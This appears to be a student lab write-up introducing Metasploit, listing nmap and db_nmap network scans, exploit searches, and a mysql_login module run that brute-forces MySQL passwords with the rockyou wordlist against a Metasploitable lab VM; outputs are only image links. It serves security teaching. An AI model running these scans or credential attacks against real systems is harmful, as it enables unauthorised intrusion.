# EX 5 Metasploit-for-reconnaissance
# Metasploit
Metasploit for reconnaissance in pentesting

# AIM:

To get introduced to Metasploit Framework and to  perform reconnaissance  in pentesting .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

```
ifconfig
```

## OUTPUT:
![alt text](ifcon.png)

```
msfconsole
```
## OUTPUT:
![alt text](msfcon.png)

```
help
```
## OUTPUT:
![alt text](help.png)


```
nmap -sT <default IP gateway>/24 -p1-1000
```
## OUTPUT:
![alt text](<nmap -st.png>)

```
db_nmap <default IP gateway>/24
```
## OUTPUT:
![alt text](db_nmap.png)

![alt text](db_nmap1.png)

```
cd /usr/share /metasploit-framework/modules/auxiliary
```
```
 ls -l
 ```
## OUTPUT: 
 ![alt text](ls-l.png)

```
search name:Microsoft type:exploit
```
## OUTPUT: 
![alt text](search.png)

```
db_nmap -sV -sC -p 3306 <metasploitable_ip_address>
```
## OUTPUT: 
![alt text](<db_nmap ip.png>)

```
search type:auxiliary mysql
```
## OUTPUT: 
![alt text](<search mysql.png>)

```
use 11
```
## OUTPUT: 
![alt text](<use 11.png>)

```
set RHOSTS <IP>
```
## OUTPUT: 
![alt text](rhost.png)

```
use auxiliary/scanner/mysql/mysql_login
```
## OUTPUT: 
![alt text](<use mysqllogin.png>)

```
set PASS_FILE /usr/share/wordlists/rockyou.txt
```
```
set RHOSTS <metasploitable-ip-address>
```
```
set BLANK_PASSWORDS true
```
```
set verbose no
```
```
run
```
## OUTPUT: 
![alt text](<pwd rockyou.png>)


## RESULT:
The Metasploit framework for reconnaissance is  examined successfully
